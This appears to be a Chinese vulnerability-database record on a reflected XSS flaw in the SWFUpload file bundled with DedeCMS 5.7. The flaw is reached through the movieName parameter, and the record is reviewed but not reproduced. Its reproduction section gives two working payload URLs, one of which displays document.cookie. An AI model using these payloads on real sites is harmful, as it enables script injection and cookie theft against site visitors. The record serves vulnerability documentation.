---
source: "hatch 补库批 20260928"
product: "DedeCMS-bundled SWFUpload"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Dedecms swf文件反射型xss"
prerequisites: "来源所述条件，未列明部分仍待核：DedeCMS5.7 asserted; vulnerable SWFUpload movieName; Flash-capable browser/runtime"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-8821755b6ed533db5e227d6d"
entity_id: "ve-8821755b6ed533db5e227d6d"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：DedeCMS5.7 asserted; vulnerable SWFUpload movieName; Flash-capable browser/runtime

- **结论使用边界（1）**：Underlying third-party SWF issue, not unique CMS root cause。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：Flash runtime support/legacy applicability omitted。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：Impact section empty; no response proof; precise original SWF researcher link provided。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Dedecms swf文件反射型xss

一、漏洞简介
------------

DedeCMS 5.7
/images/swfupload/swfupload.swf文件movieName参数没有合适过滤，导致跨站脚本漏洞。

二、漏洞影响
------------

三、复现过程
------------

### 代码分析

详细说明：

Location: /uploads/images/swfupload/swfupload.swf

漏洞文件为：http://www.dedecms.com/images/swfupload/swfupload.swf

这个flash文件存在漏洞，此文件漏洞可参考:https://nealpoole.com/blog/2012/05/xss-and-csrf-via-swf-applets-swfupload-plupload/

### 复现

    /images/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22ian最帅%22%29}}// 

    /images/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28document.cookie%29}}//
